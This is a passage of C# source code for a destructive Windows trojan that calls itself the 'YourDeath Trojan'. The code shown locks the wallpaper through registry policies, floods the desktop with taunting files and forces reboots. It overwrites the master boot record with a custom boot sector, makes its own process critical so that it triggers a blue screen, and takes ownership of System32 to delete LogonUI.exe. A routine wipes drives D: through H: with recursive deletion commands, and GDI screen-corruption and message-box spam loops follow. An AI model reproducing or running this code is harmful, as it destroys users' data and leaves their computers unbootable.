                RegistryKey wallpaper = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                wallpaper.SetValue("Wallpaper", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\a lot of skulls.jpg");
                RegistryKey wallpaperstyle = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                wallpaperstyle.SetValue("WallpaperStyle", "2");
                RegistryKey noremovewall = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop");
                noremovewall.SetValue("NoChangingWallPaper", 1, RegistryValueKind.DWord);

                // Prevent Windows 7 themes to change icons or pointers
                RegistryKey icons = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Themes");
                icons.SetValue("ThemeChangesDesktopIcons", 0, RegistryValueKind.DWord);
                
                RegistryKey pointers = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Themes");
                pointers.SetValue("ThemeChangesMousePointers", 0, RegistryValueKind.DWord);
                
                // Create 300 files on the desktop
                string desktop_files = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                File.WriteAllText(desktop_files + @"\UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead.txt", "WELCOME TO THE HELL." + Environment.NewLine + "TRY TO ESCAPE THE HELL IF YOU CAN..." + Environment.NewLine + Environment.NewLine + "GOOD LUCK.");
                try
                {
                    for (int s = 1; s < 300; s++)
                    {
                        File.Copy(desktop_files + @"\UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead.txt", desktop_files + $"\\UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead({s}).txt");
                    }
                }
                catch (Exception) { }

                // Restart the computer
                Thread.Sleep(5000);
                Process.Start("shutdown", "/r /t 0");
                Environment.Exit(-1);
            }
            else
            {
                // Overwrite the MBR
                var mbrData = new byte[] { 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4,
0x0E, 0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x04, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18,
0xCD, 0x10, 0xC3, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65, 0x72,
0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x74, 0x72, 0x61, 0x73, 0x68, 0x65,
0x64, 0x20, 0x62, 0x79, 0x20, 0x74, 0x68, 0x65, 0x20, 0x59, 0x6F, 0x75, 0x72, 0x44, 0x65, 0x61,
0x74, 0x68, 0x20, 0x54, 0x72, 0x6F, 0x6A, 0x61, 0x6E, 0x21, 0x0D, 0x0A, 0x4E, 0x6F, 0x74, 0x65,
0x3A, 0x20, 0x45, 0x76, 0x65, 0x6E, 0x20, 0x69, 0x66, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x66, 0x69,
0x78, 0x20, 0x74, 0x68, 0x65, 0x20, 0x4D, 0x42, 0x52, 0x2C, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x63,
0x61, 0x6E, 0x27, 0x74, 0x20, 0x75, 0x73, 0x65, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x63, 0x6F,
0x6D, 0x70, 0x75, 0x74, 0x65, 0x72, 0x20, 0x61, 0x67, 0x61, 0x69, 0x6E, 0x20, 0x62, 0x65, 0x63,
0x61, 0x75, 0x73, 0x65, 0x20, 0x74, 0x68, 0x65, 0x20, 0x4F, 0x53, 0x20, 0x69, 0x74, 0x73, 0x65,
0x6C, 0x66, 0x20, 0x69, 0x73, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72, 0x6F, 0x79, 0x65, 0x64, 0x21,
0x0D, 0x0A, 0x52, 0x65, 0x73, 0x74, 0x20, 0x69, 0x6E, 0x20, 0x70, 0x65, 0x61, 0x63, 0x65, 0x2E,
0x2E, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
 };
                var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                    OpenExisting, 0, IntPtr.Zero);
                try
                {
                    WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
                    CloseHandle(mbr);
                }
                catch { }

                // BSOD
                int isCritical = 1;
                int BreakOnTermination = 0x1D;
                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

                // Delete LogonUI, it only works on Windows 7, I guess
                const string quote = "\"";
                ProcessStartInfo logon = new ProcessStartInfo();
                logon.FileName = "cmd.exe";
                logon.WindowStyle = ProcessWindowStyle.Hidden;
                logon.Arguments = @"/k takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant " + quote + "%username%:F" + quote;
                Process.Start(logon);

                Thread.Sleep(1000);

                string LogonUI = @"C:\Windows\System32\LogonUI.exe";

                if (File.Exists(LogonUI))
                {
                    try
                    {
                        File.Delete(LogonUI);
                    }
                    catch (Exception) { }
                }

                Thread.Sleep(10000);

                // Start the HTML
                Process.Start(@"C:\Program Files\Temp\Hmm\What\Oh\Wait\DoNotTouchMe\Well\YouDid\Sigh\Critical\Idk\YourParentsAreMad\ItIsMe\YouAreDeadAnyway\YourDeath_HTML.html");

                Thread.Sleep(30000);

                // Start message box spam
                Process.Start(@"C:\Program Files\Temp\Hmm\What\Oh\Wait\DoNotTouchMe\Well\YouDid\Sigh\Critical\Idk\YourParentsAreMad\ItIsMe\YouAreDeadAnyway\RunAway.exe");

                Thread.Sleep(60000);

                //Stop the message box spam
                ProcessStartInfo runawayKill = new ProcessStartInfo();
                runawayKill.FileName = "cmd.exe";
                runawayKill.WindowStyle = ProcessWindowStyle.Hidden;
                runawayKill.Arguments = @"/k Taskkill /F /IM RunAway.exe && exit";
                Process.Start(runawayKill);

                // Threads after reboot
                Thread forms = new Thread(YourFormLaunch);
                Thread images = new Thread(YourDeathImage);
                Thread glitches = new Thread(GlitchScreen);
                Thread darks = new Thread(DarkScreen);

                // Start Form
                forms.Start();

                Thread.Sleep(60000);

                // Image start
                images.Start();

                Thread.Sleep(60000);

                // Image stop
                images.Abort();

                // Clear GDI
                ClearScreen();

                // Glitch start
                glitches.Start();

                Thread.Sleep(60000);

                // Glitch stop
                glitches.Abort();

                // Clear GDI
                ClearScreen();

                // Dark start
                darks.Start();

                Thread.Sleep(60000);

                // Dark stop
                darks.Abort();

                // Clear GDI
                ClearScreen();

                // Exit and BSOD
                Environment.Exit(0);
            }
        }

        public void WipePartitions()
        {
            ProcessStartInfo wp = new ProcessStartInfo();
            wp.FileName = "cmd.exe";
            wp.WindowStyle = ProcessWindowStyle.Hidden;

            // I'm sad that you lost your trivial files
            char p = 'd';
            while (p < 'i')
            {
                Thread.Sleep(3000);
                wp.Arguments = @"/k rd " + p + @":\\ /s /q && exit";
                Process.Start(wp);
                p++;
            }
        }

        // I used a method to start a message box because if I don't, you have to press OK to execute the rest of the code...

        public void MsgBox()
        {
            MessageBox.Show("Terrible decision, rest in peace...", "Oh no!", MessageBoxButtons.OK);
        }

        public void ScreenFlashing()
        {
            int count = 1000;
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);

            while (true)
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                DeleteDC(hdc);
                if (count > 51)
                    Thread.Sleep(count -= 50);
                else
                    Thread.Sleep(50);
            }
        }

        public void ScreenMelting()
        {
            Random r;
            r = new Random();
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);

            while (true)
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                BitBlt(hdc, 0, r.Next(10), r.Next(x), y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                DeleteDC(hdc);
                if (r.Next(100) == 1)
                    InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                Thread.Sleep(r.Next(10));
            }
        }

        public void YourFormLaunch()
        {
            var NextForm = new YourForm();
            NextForm.ShowDialog();
        }

        Random r = new Random();

        public void YourDeathImage()
        {
            while (true)
            {
                r = new Random();
                Bitmap bitmap = new Bitmap(@"C:\Program Files\Temp\Hmm\What\Oh\Wait\DoNotTouchMe\Well\YouDid\Sigh\Critical\Idk\YourParentsAreMad\ItIsMe\YouAreDeadAnyway\YourImage.jpg");

                IntPtr desktop = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawImage(bitmap, r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), 200, 250);
                }
                ReleaseDC(IntPtr.Zero, desktop);

                Thread.Sleep(500);
            }
        }

        int glitch_count = 2000;

        public void GlitchScreen()
        {
            while (true)
            {
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                RECT myRect;
                GetWindowRect(hwnd, out myRect);
                BitBlt(hdc, r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), myRect.Right += r.Next(500), myRect.Bottom += r.Next(500), hdc, 0, 0, NORMAL);

                if (glitch_count > 200)

                    Thread.Sleep(glitch_count -= 100);
                else
                    Thread.Sleep(100);
            }
        }

        int dark_count = 3000;

        public void DarkScreen()
        {
            while (true)
            {
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                RECT myRect;
                GetWindowRect(hwnd, out myRect);
                BitBlt(hdc, r.Next(-5, 5), r.Next(-5, 5), myRect.Right, myRect.Bottom, hdc, 0, 0, DIRTY);
                ReleaseDC(hwnd, hdc);

                if (dark_count > 200)
                    Thread.Sleep(dark_count -= 100);
                else
                    Thread.Sleep(100);
            }
        }

        public void ClearScreen()
        {
            int num = 0;
            while (num < 10)
            {
                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                num++;
                Thread.Sleep(10);
            }
        }
    }
}
